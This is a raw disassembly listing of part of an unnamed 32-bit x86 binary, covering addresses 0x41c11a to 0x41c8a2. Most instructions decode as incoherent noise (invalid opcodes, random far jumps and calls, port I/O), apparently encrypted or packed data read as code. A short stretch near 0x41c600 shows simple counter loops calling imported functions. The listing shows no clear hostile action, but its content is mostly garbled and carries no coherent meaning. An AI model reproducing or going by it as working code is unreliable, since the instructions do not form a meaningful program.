  41c11a:	fnstcw WORD PTR [esp+edi*8-0x37fab4c]
  41c121:	popa   
  41c122:	shl    DWORD PTR [eax],1
  41c124:	xor    esi,DWORD PTR ds:0xe75f7b83
  41c12a:	stc    
  41c12b:	jbe    0x41c123
  41c12d:	mov    eax,0xac61147d
  41c132:	jae    0x41c185
  41c134:	pop    edx
  41c135:	jns    0x41c0d4
  41c137:	adc    al,0xa2
  41c139:	int3   
  41c13a:	mov    ebx,0x5e31d218
  41c13f:	inc    ebx
  41c140:	and    BYTE PTR [eax+esi*8+0x1c],dl
  41c144:	jne    0x41c153
  41c146:	retf   
  41c147:	clc    
  41c148:	cwde   
  41c149:	inc    esp
  41c14b:	push   ds
  41c14c:	xchg   esp,eax
  41c14d:	cli    
  41c14e:	mov    bh,0x1b
  41c150:	jmp    0x9555:0x148dc8bd
  41c157:	cmp    dh,al
  41c159:	std    
  41c15a:	fld    TBYTE PTR [ebp+0x5b]
  41c15d:	xadd   ch,bl
  41c160:	fwait
  41c161:	mov    dl,0xaf
  41c163:	jne    0x41c14e
  41c165:	shl    BYTE PTR [edx+edx*4-0x70],1
  41c169:	aaa    
  41c16a:	xchg   ebx,eax
  41c16b:	fstp   DWORD PTR [esp+eax*1+0x5f]
  41c16f:	jmp    0x41c15f
  41c171:	jne    0x41c1b1
  41c173:	xchg   edi,eax
  41c174:	pusha  
  41c175:	mov    dh,0xb2
  41c177:	mov    edi,0xda76864d
  41c17c:	or     al,0xbb
  41c17e:	dec    esi
  41c17f:	cmp    cl,BYTE PTR [ecx]
  41c181:	inc    ebx
  41c182:	adc    ah,cl
  41c184:	int3   
  41c185:	out    0x38,al
  41c187:	push   ss
  41c188:	aam    0xae
  41c18a:	pop    ebx
  41c18b:	pop    ss
  41c18c:	bound  esp,QWORD PTR [ebx-0x51]
  41c18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c190:	ins    DWORD PTR es:[edi],dx
  41c191:	or     eax,0x70ce90e
  41c196:	push   edx
  41c197:	retf   0xa0fc
  41c19a:	ss pop es
  41c19c:	or     eax,DWORD PTR [esi]
  41c19e:	push   es
  41c19f:	inc    ebp
  41c1a0:	ins    DWORD PTR es:[edi],dx
  41c1a1:	and    esi,edx
  41c1a3:	(bad)  
  41c1a4:	(bad)  
  41c1a5:	adc    DWORD PTR [eax],edx
  41c1a7:	aaa    
  41c1a8:	pop    ebx
  41c1a9:	or     al,BYTE PTR [ebx-0x72]
  41c1ac:	imul   edi,DWORD PTR [ebx-0x5e885bd5],0x1b39eefd
  41c1b6:	cmc    
  41c1b7:	loope  0x41c19a
  41c1b9:	jae    0x41c1dc
  41c1bb:	fdiv   st,st(2)
  41c1bd:	cmp    ebx,DWORD PTR [ebx+0x45b4d9d1]
  41c1c3:	enter  0xf1b6,0xaf
  41c1c7:	lea    edx,[edx+0x78]
  41c1ca:	scas   eax,DWORD PTR es:[edi]
  41c1cb:	mov    ecx,0xae3944a7
  41c1d0:	push   ecx
  41c1d1:	aad    0x5a
  41c1d3:	imul   BYTE PTR [ebx-0xf]
  41c1d6:	mov    al,ds:0x34002a1f
  41c1db:	imul   esp
  41c1dd:	cli    
  41c1de:	ret    0x1ce
  41c1e1:	les    edi,FWORD PTR [edx-0x6a8ddfd0]
  41c1e7:	adc    BYTE PTR [ebp+0xf81111a],cl
  41c1ed:	fs dec ecx
  41c1ef:	pusha  
  41c1f0:	pop    ecx
  41c1f1:	add    BYTE PTR [ebp+0x69],ch
  41c1f4:	sbb    eax,esp
  41c1f6:	jae    0x41c1fd
  41c1f8:	pushf  
  41c1f9:	fist   DWORD PTR [ecx]
  41c1fb:	mov    ch,0x4f
  41c1fd:	(bad)  
  41c1fe:	in     al,0xcd
  41c200:	or     eax,0x9dc56d75
  41c205:	jg     0x41c214
  41c207:	inc    edi
  41c208:	test   BYTE PTR [ecx],bl
  41c20a:	or     DWORD PTR [ecx+0x2c],esp
  41c20d:	loopne 0x41c20d
  41c20f:	or     al,0xa2
  41c211:	dec    edx
  41c212:	rol    dl,1
  41c214:	push   esi
  41c215:	aam    0x87
  41c217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c218:	mov    dh,0xd1
  41c21a:	push   cs
  41c21b:	inc    ebp
  41c21c:	ret    
  41c21d:	test   al,0x25
  41c21f:	push   ebx
  41c220:	or     dl,dl
  41c222:	sub    ah,0x14
  41c225:	pop    ecx
  41c226:	sbb    BYTE PTR [ebx],dl
  41c228:	ret    0x55f8
  41c22b:	add    BYTE PTR [ecx],cl
  41c22d:	cmp    bh,BYTE PTR [eax]
  41c22f:	jno    0x41c255
  41c231:	and    eax,0x81c62ac3
  41c236:	sbb    cl,BYTE PTR [eax-0x61]
  41c239:	scas   eax,DWORD PTR es:[edi]
  41c23a:	sbb    eax,0xbc47c68a
  41c23f:	jns    0x41c2b5
  41c241:	loope  0x41c28f
  41c243:	lds    eax,FWORD PTR [ecx-0xe915018]
  41c249:	jbe    0x41c24c
  41c24b:	adc    esi,DWORD PTR [edi+0x31]
  41c24e:	dec    esi
  41c24f:	out    0xda,eax
  41c251:	fldenv [ebx+0xe]
  41c254:	adc    BYTE PTR [ebx+0xa],cl
  41c257:	mov    DWORD PTR [edi+0x4],edx
  41c25a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c25b:	jne    0x41c263
  41c25d:	retf   0x6c7c
  41c260:	les    ebp,FWORD PTR [ebp+0x19]
  41c263:	mov    edx,0x78bf34d6
  41c268:	sti    
  41c269:	or     DWORD PTR [ecx-0x3b],edx
  41c26c:	repnz mov eax,0x3ff6b812
  41c272:	ror    BYTE PTR [ecx+0x56afb7c4],1
  41c278:	fstp   DWORD PTR [edi+0x50]
  41c27b:	pop    ss
  41c27c:	fiadd  DWORD PTR [eax+edi*8+0x29]
  41c280:	inc    eax
  41c281:	xchg   esi,eax
  41c282:	repnz dec ebp
  41c284:	inc    edi
  41c285:	xchg   ecx,eax
  41c286:	mov    edi,0x423e7590
  41c28b:	std    
  41c28c:	push   ebp
  41c28d:	ficom  DWORD PTR [edi-0x3e]
  41c290:	adc    al,0x47
  41c292:	aaa    
  41c293:	adc    BYTE PTR [eax],dl
  41c295:	xchg   ecx,eax
  41c296:	xchg   DWORD PTR [ecx],esi
  41c298:	cmp    eax,0xa5ddb820
  41c29d:	lds    ebp,FWORD PTR [edi+eax*1]
  41c2a0:	iret   
  41c2a1:	sub    al,0x5f
  41c2a3:	(bad)  
  41c2a4:	cmp    dl,BYTE PTR [eax+ecx*4]
  41c2a7:	jle    0x41c284
  41c2a9:	xor    eax,0x1cbac449
  41c2ae:	imul   eax,DWORD PTR [ebx],0x23
  41c2b1:	xor    dl,BYTE PTR [ecx+ebx*4+0xe091729]
  41c2b8:	jmp    0x41c318
  41c2ba:	mov    ebx,eax
  41c2bc:	pop    ds
  41c2bd:	fwait
  41c2be:	sbb    DWORD PTR [edi-0x72],eax
  41c2c1:	xor    ecx,DWORD PTR [ecx+0xae2ed44]
  41c2c7:	inc    eax
  41c2c8:	arpl   WORD PTR [edx+0x44ba657e],bp
  41c2ce:	xchg   ebx,eax
  41c2cf:	aaa    
  41c2d0:	jne    0x41c2ff
  41c2d2:	xor    ebp,edi
  41c2d4:	pop    eax
  41c2d5:	push   edi
  41c2d6:	adc    eax,0x1a54cd90
  41c2db:	sbb    DWORD PTR [edx-0x6],ecx
  41c2de:	xchg   edx,eax
  41c2df:	popa   
  41c2e0:	fistp  QWORD PTR [edx+edx*2-0x45]
  41c2e4:	jb     0x41c348
  41c2e6:	mov    ecx,gs
  41c2e8:	out    dx,eax
  41c2e9:	push   ss
  41c2ea:	mov    eax,ds:0xbfd60e93
  41c2ef:	push   0xf3785e14
  41c2f4:	cwde   
  41c2f5:	or     al,0x26
  41c2f7:	mov    dl,0x80
  41c2f9:	add    al,0xd4
  41c2fb:	(bad)  
  41c2fc:	shl    DWORD PTR [edx],1
  41c2fe:	clc    
  41c2ff:	xchg   ecx,eax
  41c300:	pop    ss
  41c301:	fwait
  41c302:	sbb    BYTE PTR [esi+eiz*1-0x30],dl
  41c306:	shr    BYTE PTR [ebx],1
  41c308:	adc    al,BYTE PTR [edi-0x3a]
  41c30b:	sub    BYTE PTR [eax],ah
  41c30d:	nop
  41c30e:	cld    
  41c30f:	imul   esi,DWORD PTR [eax-0x41d90653],0xeea31d47
  41c319:	ins    DWORD PTR es:[edi],dx
  41c31a:	out    dx,al
  41c31b:	sub    al,0xac
  41c31d:	and    al,0xbf
  41c31f:	pop    es
  41c320:	cmp    DWORD PTR [eax-0x3d],ecx
  41c323:	cmp    DWORD PTR [ebx-0x3c],ebp
  41c326:	jo     0x41c312
  41c328:	adc    eax,0xd185eda9
  41c32d:	out    0x2b,al
  41c32f:	cmp    BYTE PTR [ebx+0x2],bh
  41c332:	pop    ss
  41c333:	adc    eax,0x718bbf12
  41c338:	push   0x1b168f06
  41c33d:	loope  0x41c367
  41c33f:	pop    ecx
  41c340:	inc    edx
  41c341:	retf   0x9273
  41c344:	xor    DWORD PTR [esi+0x21],esp
  41c347:	sbb    DWORD PTR [eax-0x1b],ebx
  41c34a:	dec    eax
  41c34b:	xor    esp,esi
  41c34d:	popf   
  41c34e:	mov    ds:0x6794cb3f,eax
  41c353:	push   ebp
  41c354:	add    al,0xb5
  41c356:	push   es
  41c357:	xchg   edi,eax
  41c358:	nop
  41c359:	repz sub eax,0x4a8d2fb9
  41c35f:	call   0x2841:0x4ca39146
  41c366:	repz pop ss
  41c368:	icebp  
  41c369:	adc    DWORD PTR [ebx+0x6b],ecx
  41c36c:	mov    ebx,0x5d6bec7c
  41c371:	nop
  41c372:	ss ins DWORD PTR es:[edi],dx
  41c374:	cld    
  41c375:	cdq    
  41c376:	xchg   DWORD PTR [eax],edx
  41c378:	popa   
  41c379:	cmp    BYTE PTR [edx-0x50],cl
  41c37c:	sar    DWORD PTR [edx],cl
  41c37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c37f:	cdq    
  41c380:	sub    dl,BYTE PTR [eax+ecx*1-0x1a]
  41c384:	scas   al,BYTE PTR es:[edi]
  41c385:	inc    edi
  41c386:	push   es
  41c387:	cdq    
  41c388:	push   ss
  41c389:	jb     0x41c31d
  41c38b:	mov    edx,esp
  41c38d:	mov    ds:0xcbd610d3,eax
  41c392:	sti    
  41c393:	cmp    bh,al
  41c395:	pop    edi
  41c396:	sbb    DWORD PTR [ebp-0x55],edi
  41c399:	mov    BYTE PTR [edi+edi*2+0x1a],0x93
  41c39e:	mov    dh,0xbb
  41c3a0:	or     al,0xe5
  41c3a2:	jecxz  0x41c400
  41c3a4:	(bad)  
  41c3a6:	push   ss
  41c3a7:	les    edi,FWORD PTR [eax+0xb02204e]
  41c3ad:	in     eax,dx
  41c3ae:	mov    ss,WORD PTR [ecx]
  41c3b0:	jbe    0x41c40a
  41c3b2:	(bad)  
  41c3b3:	outs   dx,BYTE PTR ds:[esi]
  41c3b4:	loopne 0x41c33e
  41c3b6:	mov    ds:0x4144688c,al
  41c3bb:	test   DWORD PTR ss:[eax+edx*1-0x30],ebx
  41c3c0:	push   edx
  41c3c1:	mov    al,0x3a
  41c3c3:	and    ah,bh
  41c3c5:	test   BYTE PTR [ecx+0x52],al
  41c3c8:	stos   DWORD PTR es:[edi],eax
  41c3c9:	and    edx,DWORD PTR [ebp+0x2e622801]
  41c3cf:	adc    DWORD PTR [edx+ebp*1+0x61d34d14],ebx
  41c3d6:	aad    0xd2
  41c3d8:	dec    ebx
  41c3d9:	pop    eax
  41c3da:	or     al,0x40
  41c3dc:	jne    0x41c3c7
  41c3de:	lds    edx,FWORD PTR [esp+edx*2-0x73]
  41c3e2:	shr    DWORD PTR [ecx+ebx*4],cl
  41c3e5:	mov    bl,0x53
  41c3e7:	pop    ss
  41c3e8:	xlat   BYTE PTR ds:[ebx]
  41c3e9:	imul   eax,ebx,0x7f
  41c3ec:	and    dh,cl
  41c3ee:	mov    ebx,DWORD PTR [edi+0x7ff33122]
  41c3f4:	mov    eax,0x72deb6c9
  41c3f9:	inc    ecx
  41c3fa:	jb     0x41c3ed
  41c3fc:	jmp    0x34c1a28
  41c401:	out    0x7,al
  41c403:	mov    ebx,DWORD PTR [ecx+0x9]
  41c406:	in     eax,0x98
  41c408:	imul   esp,DWORD PTR [ecx+0x1c],0xeaaa34a4
  41c40f:	jg     0x41c426
  41c411:	and    dl,bl
  41c413:	lods   al,BYTE PTR ds:[esi]
  41c414:	pop    eax
  41c415:	and    ebx,DWORD PTR [edi+0x6ba65c9e]
  41c41b:	pusha  
  41c41c:	rol    esp,cl
  41c41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c41f:	xchg   ah,cl
  41c421:	js     0x41c40c
  41c423:	jmp    0xd2f6:0xced1a6ed
  41c42a:	(bad)  
  41c42b:	xchg   edi,eax
  41c42c:	jmp    0x2267:0x59211df5
  41c433:	jle    0x41c497
  41c435:	mov    ?,WORD PTR [ebp-0x3]
  41c438:	mov    cl,0x58
  41c43a:	mov    cl,0xf4
  41c43c:	in     al,dx
  41c43d:	stos   BYTE PTR es:[edi],al
  41c43e:	dec    ecx
  41c43f:	push   eax
  41c440:	int3   
  41c441:	(bad)  
  41c442:	leave  
  41c443:	sbb    DWORD PTR [ecx-0x2c],0x2cbf75a0
  41c44a:	(bad)  
  41c44b:	in     eax,0x5c
  41c44d:	and    al,dl
  41c44f:	call   0x6f1:0x51bed979
  41c456:	fist   DWORD PTR [edx-0xb63aa71]
  41c45c:	fiadd  DWORD PTR [eax+ebx*1]
  41c45f:	or     eax,0xf3e8706f
  41c464:	loopne 0x41c3fc
  41c466:	inc    ebp
  41c467:	nop
  41c468:	fcom   DWORD PTR [esi+0x33]
  41c46b:	daa    
  41c46c:	daa    
  41c46d:	dec    ebx
  41c46e:	push   ds
  41c46f:	xor    cl,bh
  41c471:	repz xchg esp,eax
  41c473:	sti    
  41c474:	adc    DWORD PTR [esi+0x31bbb512],eax
  41c47a:	sbb    al,0x86
  41c47c:	out    dx,eax
  41c47d:	push   0xfffffff6
  41c47f:	rol    BYTE PTR [edi-0x6b],cl
  41c482:	mov    esp,0xd1e72a37
  41c487:	cmc    
  41c488:	inc    esp
  41c489:	mov    ecx,0x71b3d0e0
  41c48e:	xor    DWORD PTR [edx+0x6d],ebx
  41c491:	fistp  DWORD PTR [edi+0x6b52e974]
  41c497:	ins    BYTE PTR es:[edi],dx
  41c498:	cmp    cl,BYTE PTR [ecx]
  41c49a:	sahf   
  41c49b:	leave  
  41c49c:	mov    eax,ds:0xa94dd0f4
  41c4a1:	adc    BYTE PTR [ecx],dh
  41c4a3:	push   esi
  41c4a4:	push   ebx
  41c4a5:	pop    ss
  41c4a6:	sub    BYTE PTR [ecx-0x33],dl
  41c4a9:	xchg   ecx,eax
  41c4aa:	sub    eax,DWORD PTR [ecx]
  41c4ac:	das    
  41c4ad:	rol    BYTE PTR [edi-0x34423cdd],0x5c
  41c4b4:	fwait
  41c4b5:	mov    al,0x2e
  41c4b7:	mov    ecx,DWORD PTR [eax-0x360a403]
  41c4bd:	and    DWORD PTR es:[ebp-0x68],edi
  41c4c1:	fmul   QWORD PTR [esi-0x58845f71]
  41c4c7:	cmp    BYTE PTR [ecx],cl
  41c4c9:	jmp    0x41c46c
  41c4cb:	push   esi
  41c4cc:	xor    al,0xcb
  41c4ce:	in     eax,0xc
  41c4d0:	rcl    esi,cl
  41c4d2:	dec    esi
  41c4d4:	xchg   esp,eax
  41c4d5:	sbb    al,0x5b
  41c4d7:	in     eax,dx
  41c4d8:	adc    DWORD PTR [bx+0xd],0xffffffb3
  41c4dd:	call   0x2297:0x3b39b213
  41c4e4:	call   0x3f026462
  41c4e9:	test   BYTE PTR [ecx-0x60],bl
  41c4ec:	push   ebp
  41c4ed:	pusha  
  41c4ee:	adc    al,0x36
  41c4f0:	push   ebp
  41c4f1:	jl     0x41c515
  41c4f3:	fst    DWORD PTR [ebx-0x6d]
  41c4f6:	mov    WORD PTR [ecx+0x306a5879],es
  41c4fc:	and    eax,0xdada457
  41c501:	fidiv  DWORD PTR [ecx+ebx*2]
  41c504:	nop
  41c505:	das    
  41c506:	je     0x41c4c6
  41c508:	push   0xfffffff6
  41c50a:	and    BYTE PTR [ebp-0x4178ba10],0xf5
  41c511:	rcl    ebp,0x8c
  41c514:	lea    edi,[ecx+0x5f]
  41c517:	daa    
  41c518:	repnz cwde 
  41c51a:	inc    ecx
  41c51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c51c:	nop
  41c51d:	or     BYTE PTR [edi],0xbe
  41c520:	std    
  41c521:	mov    eax,ds:0xb0b1da7d
  41c526:	adc    bl,BYTE PTR [ecx]
  41c528:	cli    
  41c529:	pop    ecx
  41c52a:	out    dx,eax
  41c52b:	xlat   BYTE PTR ds:[ebx]
  41c52c:	mov    edx,0xe3ff2993
  41c531:	loope  0x41c4d4
  41c533:	and    al,0x79
  41c535:	retf   0x19c7
  41c538:	les    ebp,FWORD PTR [ecx+esi*4+0x77cc1f7a]
  41c53f:	jg     0x41c589
  41c541:	das    
  41c542:	push   cs
  41c543:	aas    
  41c544:	leave  
  41c545:	mov    DWORD PTR [esi-0x1982e1da],esi
  41c54b:	push   0x2af4e82e
  41c550:	mov    eax,ds:0x4922470e
  41c555:	call   0x4067:0xbc5c7d4
  41c55c:	fnstenv fs:[ebx]
  41c55f:	sbb    DWORD PTR [ebx+ecx*4-0xf],edx
  41c563:	fimul  DWORD PTR [esp+edx*4]
  41c566:	inc    esi
  41c567:	(bad)
  41c56b:	xlat   BYTE PTR ds:[ebx]
  41c56d:	add    DWORD PTR [ebp+0x8],esp
  41c570:	push   0xffffffbf
  41c572:	mov    dl,0xe2
  41c574:	pusha  
  41c575:	mov    ebp,0xe0449635
  41c57a:	xchg   ecx,eax
  41c57b:	jle    0x41c51a
  41c57d:	test   ah,0x78
  41c580:	add    edi,esi
  41c582:	and    al,BYTE PTR ds:0xa2f9f0ce
  41c588:	out    dx,al
  41c589:	and    bl,BYTE PTR [edx+0x25]
  41c58c:	fsubr  DWORD PTR [ebp-0x67]
  41c58f:	adc    ecx,DWORD PTR [edx+0x7d8763a8]
  41c595:	pop    eax
  41c596:	cwde   
  41c597:	add    eax,0xc2a65e91
  41c59c:	push   0x6ba8412f
  41c5a1:	xchg   ebx,eax
  41c5a2:	aaa    
  41c5a3:	inc    ebx
  41c5a4:	dec    ebx
  41c5a5:	add    DWORD PTR [edi-0x1b],edi
  41c5a8:	cmp    edi,DWORD PTR [ebp-0x4e56a1d7]
  41c5ae:	or     BYTE PTR [esi+ebp*8],cl
  41c5b1:	inc    ebx
  41c5b2:	sbb    eax,0xe492452c
  41c5b7:	or     eax,0x2b64741a
  41c5bc:	mov    DWORD PTR [esi-0x46d4772f],ebp
  41c5c2:	(bad)  
  41c5c3:	adc    BYTE PTR [ebp-0xd8645df],dh
  41c5c9:	(bad)  
  41c5ca:	les    ebp,FWORD PTR [esi-0x10]
  41c5cd:	xchg   DWORD PTR [edi+0x0],edi
  41c5d0:	data16 jne 0x41c649
  41c5d3:	out    0x73,eax
  41c5d5:	dec    ebp
  41c5d6:	inc    eax
  41c5d7:	stc    
  41c5d8:	icebp  
  41c5d9:	xor    DWORD PTR [esi+0x6],0xffffffcb
  41c5dd:	clc    
  41c5de:	les    esp,FWORD PTR [ebp+0x78d7c32]
  41c5e4:	sub    ch,BYTE PTR [edx]
  41c5e6:	lods   al,BYTE PTR ds:[esi]
  41c5e7:	mov    edi,0xe92beb12
  41c5ec:	xor    bl,BYTE PTR [edi+0x3c]
  41c5ef:	sub    ah,al
  41c5f1:	test   BYTE PTR [ecx],0x55
  41c5f4:	xlat   BYTE PTR ds:[ebx]
  41c5f5:	imul   esi,DWORD PTR [ebp+ebx*8-0x6fce5fe],0xa3452581
  41c600:	inc    edx
  41c601:	add    BYTE PTR [eax],al
  41c603:	add    BYTE PTR [eax],al
  41c605:	add    cl,ch
  41c607:	or     eax,0x8b000000
  41c60c:	sbb    eax,0x42a345
  41c611:	inc    ebx
  41c612:	mov    DWORD PTR ds:0x42a345,ebx
  41c618:	cmp    DWORD PTR ds:0x42a345,0x10
  41c61f:	jae    0x41cbd2
  41c625:	cmp    DWORD PTR ds:0x42a345,0xa
  41c62c:	jne    0x41c63b
  41c632:	push   DWORD PTR [ebp-0x28]
  41c635:	call   DWORD PTR ds:0x425000
  41c63b:	cmp    DWORD PTR ds:0x42a345,0x9
  41c642:	jne    0x41c655
  41c648:	mov    ebx,DWORD PTR ds:0x42a345
  41c64e:	inc    ebx
  41c64f:	mov    DWORD PTR ds:0x42a345,ebx
  41c655:	jmp    0x41c60b
  41c65a:	mov    DWORD PTR ds:0x42a375,0x18
  41c664:	cmp    DWORD PTR ds:0x42a375,0x0
  41c66b:	je     0x41cbd2
  41c671:	cmp    DWORD PTR ds:0x42a375,0x5
  41c678:	jne    0x41c68c
  41c67e:	push   0x6522
  41c683:	push   DWORD PTR [ebp-0xc]
  41c686:	call   DWORD PTR ds:0x425004
  41c68c:	cmp    DWORD PTR ds:0x42a375,0x6
  41c693:	jne    0x41c6a8
  41c699:	xor    ebx,ebx
  41c69b:	xor    ebx,DWORD PTR ds:0x42a375
  41c6a1:	dec    ebx
  41c6a2:	mov    DWORD PTR ds:0x42a375,ebx
  41c6a8:	mov    ebx,DWORD PTR ds:0x42a375
  41c6ae:	dec    ebx
  41c6af:	mov    DWORD PTR ds:0x42a375,ebx
  41c6b5:	jmp    0x41c664
  41c6ba:	or     DWORD PTR ds:0x42a385,edi
  41c6c0:	jmp    0x41cbd2
  41c6c5:	cmp    eax,0xc9cfc5c2
  41c6ca:	fcmovnbe st,st(5)
  41c6cc:	rol    BYTE PTR [esp+ebp*4-0x7b46924c],cl
  41c6d3:	jecxz  0x41c686
  41c6d5:	mov    eax,ds:0x73787f9d
  41c6da:	jl     0x41c754
  41c6dc:	js     0x41c71c
  41c6de:	inc    edx
  41c6df:	stc    
  41c6e0:	inc    eax
  41c6e1:	mov    ecx,?
  41c6e3:	push   eax
  41c6e4:	popa   
  41c6e5:	jge    0x41c717
  41c6e7:	jo     0x41c71e
  41c6e9:	ficomp DWORD PTR [edx]
  41c6eb:	bound  ebx,QWORD PTR [edx-0x79]
  41c6ee:	add    DWORD PTR [ebx+0x38],edx
  41c6f1:	inc    edx
  41c6f2:	jnp    0x41c6c5
  41c6f4:	cmp    ecx,DWORD PTR [ebx+0x49]
  41c6f7:	push   esi
  41c6f8:	sbb    BYTE PTR [ecx+0x66],ah
  41c6fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6fc:	fmul   DWORD PTR [edi+0x174c44e1]
  41c702:	in     eax,0x88
  41c704:	adc    al,BYTE PTR [eax]
  41c706:	sbb    DWORD PTR [ecx],edi
  41c708:	icebp  
  41c709:	out    0x27,al
  41c70b:	std    
  41c70c:	aaa    
  41c70d:	in     al,dx
  41c70e:	out    dx,al
  41c70f:	int    0x9e
  41c711:	and    al,0x71
  41c713:	dec    edx
  41c714:	lds    edx,FWORD PTR [ebx]
  41c716:	out    dx,eax
  41c717:	cli    
  41c718:	call   0xf7b8:0x1ffe2129
  41c71f:	call   0xcba1:0x41b46ff1
  41c726:	outs   dx,BYTE PTR ds:[esi]
  41c727:	jge    0x41c6f5
  41c729:	xor    edi,DWORD PTR [ecx-0x63]
  41c72c:	(bad)  
  41c72d:	lock mov eax,cs
  41c730:	pop    eax
  41c731:	push   edx
  41c732:	aaa    
  41c733:	aaa    
  41c734:	push   eax
  41c735:	prefetcht1 BYTE PTR [eax-0x40]
  41c739:	aaa    
  41c73a:	pop    ebx
  41c73b:	dec    ebx
  41c73c:	stos   DWORD PTR es:[edi],eax
  41c73d:	jae    0x41c6fa
  41c73f:	jns    0x41c6d0
  41c741:	dec    esi
  41c742:	gs inc ebx
  41c744:	(bad)  
  41c746:	adc    edi,ebx
  41c748:	xchg   ecx,eax
  41c749:	mov    ebx,0x12127453
  41c74e:	cwde   
  41c74f:	retf   
  41c750:	dec    ax
  41c752:	pop    es
  41c753:	lock sti 
  41c755:	xor    bh,BYTE PTR [ebx+0x75]
  41c758:	(bad)  
  41c759:	jmp    0x41c7cd
  41c75b:	retf   0xc0bd
  41c75e:	sbb    dh,al
  41c760:	sub    esp,esp
  41c762:	stos   DWORD PTR es:[edi],eax
  41c763:	mov    ah,0xee
  41c765:	bound  ecx,QWORD PTR [eax]
  41c767:	jb     0x41c6fe
  41c769:	out    dx,eax
  41c76a:	sbb    ebx,edi
  41c76c:	rcl    bl,0x67
  41c76f:	fsubp  st(3),st
  41c771:	(bad)  
  41c772:	xor    eax,0x536fbf23
  41c777:	icebp  
  41c778:	cmp    DWORD PTR [eax-0x738cea69],ecx
  41c77e:	inc    edi
  41c77f:	in     al,dx
  41c780:	dec    eax
  41c781:	xor    BYTE PTR [edx+0x4a],ah
  41c784:	sbb    eax,esp
  41c786:	popf   
  41c787:	jbe    0x41c77d
  41c789:	cmp    DWORD PTR [ebx],esp
  41c78b:	ss daa 
  41c78d:	add    al,0x84
  41c78f:	dec    edx
  41c790:	pop    edi
  41c791:	mov    dl,0x30
  41c793:	daa    
  41c794:	daa    
  41c795:	pop    esi
  41c796:	jmp    0x41c71b
  41c798:	fcmovb st,st(2)
  41c79a:	popa   
  41c79b:	ins    BYTE PTR es:[edi],dx
  41c79c:	lock mov bl,0xdb
  41c79f:	ss jle 0x41c806
  41c7a2:	(bad)  
  41c7a3:	mov    dh,0xd6
  41c7a5:	inc    ebx
  41c7a6:	push   ds
  41c7a7:	mov    ds:0x5f7dfe39,al
  41c7ac:	push   ebx
  41c7ad:	dec    ebp
  41c7ae:	dec    esp
  41c7af:	pop    eax
  41c7b0:	jg     0x41c817
  41c7b2:	sbb    edi,DWORD PTR [eax-0x4d02f70b]
  41c7b8:	push   esp
  41c7b9:	pop    ecx
  41c7ba:	push   ebp
  41c7bb:	cwde   
  41c7bc:	adc    esp,ecx
  41c7be:	lock call 0x9c0228fe
  41c7c4:	xchg   edi,eax
  41c7c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7c6:	scas   eax,DWORD PTR es:[edi]
  41c7c7:	push   esp
  41c7c8:	push   ss
  41c7c9:	push   cs
  41c7ca:	cld    
  41c7cb:	pop    edi
  41c7cc:	push   0x966ffc18
  41c7d1:	shl    DWORD PTR [edi],0x25
  41c7d4:	inc    edx
  41c7d5:	adc    al,0x37
  41c7d7:	cdq    
  41c7d8:	les    edi,FWORD PTR [edx]
  41c7da:	jmp    0x9b2:0xbd7fda9a
  41c7e1:	nop
  41c7e2:	gs push edi
  41c7e4:	call   0xfe3f3d87
  41c7e9:	xchg   esi,eax
  41c7ea:	lods   eax,DWORD PTR ds:[esi]
  41c7eb:	retf   
  41c7ec:	push   ds
  41c7ed:	imul   esi,DWORD PTR [ebp+0x5f],0x4c
  41c7f1:	mov    al,ds:0xaf110f3b
  41c7f6:	sbb    eax,DWORD PTR [ecx-0x7d]
  41c7f9:	push   es
  41c7fa:	push   edi
  41c7fb:	inc    dx
  41c7fd:	stos   BYTE PTR es:[edi],al
  41c7fe:	xor    BYTE PTR ds:0xb99cbfd,0xaf
  41c805:	out    dx,eax
  41c806:	push   esp
  41c807:	jbe    0x41c7bb
  41c809:	cdq    
  41c80a:	push   0x88dbbab
  41c80f:	iret   
  41c810:	in     al,0x22
  41c812:	jp     0x41c7db
  41c814:	cs dec esi
  41c816:	sbb    DWORD PTR [ebx+0xab7a80b],0xd686179b
  41c820:	outs   dx,DWORD PTR ds:[esi]
  41c821:	(bad)  
  41c822:	fisub  WORD PTR [esi+0x37f96e19]
  41c828:	xor    eax,0x1c0398c9
  41c82d:	push   ecx
  41c82e:	pushf  
  41c82f:	push   eax
  41c830:	imul   DWORD PTR [ebx-0x11]
  41c833:	jp     0x41c87c
  41c835:	fimul  DWORD PTR [edx]
  41c837:	addr16 inc edx
  41c839:	ins    DWORD PTR es:[edi],dx
  41c83a:	or     bl,BYTE PTR [edx]
  41c83c:	aam    0xec
  41c83e:	out    0x51,al
  41c840:	mov    al,0x11
  41c842:	sub    bh,cl
  41c844:	push   0x654e74f9
  41c849:	gs adc eax,0xee11bfae
  41c84f:	add    ah,BYTE PTR [edx]
  41c851:	sub    DWORD PTR [edx+ebp*2-0x23],edi
  41c855:	or     eax,DWORD PTR ds:0xbd60b37d
  41c85b:	cwde   
  41c85c:	icebp  
  41c85d:	pop    ds
  41c85e:	sbb    eax,0xc5dd9908
  41c863:	push   ds
  41c864:	jp     0x41c856
  41c866:	test   BYTE PTR ds:0x8f6ba3d1,ah
  41c86c:	call   0xd6cc6b42
  41c871:	xlat   BYTE PTR ds:[ebx]
  41c872:	inc    ebp
  41c873:	sbb    bl,BYTE PTR [ebp-0x2e]
  41c876:	lods   al,BYTE PTR ds:[esi]
  41c877:	mov    al,0xef
  41c879:	jae    0x41c8ba
  41c87b:	and    DWORD PTR [edx+edx*1],ebx
  41c87e:	bnd ja 0x41c8fc
  41c881:	sub    dh,cl
  41c883:	sti    
  41c884:	pop    ebx
  41c885:	jecxz  0x41c864
  41c887:	xor    al,0xa
  41c889:	stos   DWORD PTR es:[edi],eax
  41c88a:	add    eax,0x1f31b374
  41c88f:	sahf   
  41c890:	xor    edi,DWORD PTR [edi]
  41c892:	xlat   BYTE PTR ds:[ebx]
  41c893:	adc    bh,al
  41c895:	hlt    
  41c896:	sub    ebx,esi
  41c898:	popa   
  41c899:	add    eax,0x30279e79
  41c89e:	iret   
  41c89f:	test   al,0x6f
  41c8a1:	inc    edi
  41c8a2:	fadd   QWORD PTR [edi-0x58e73c85]
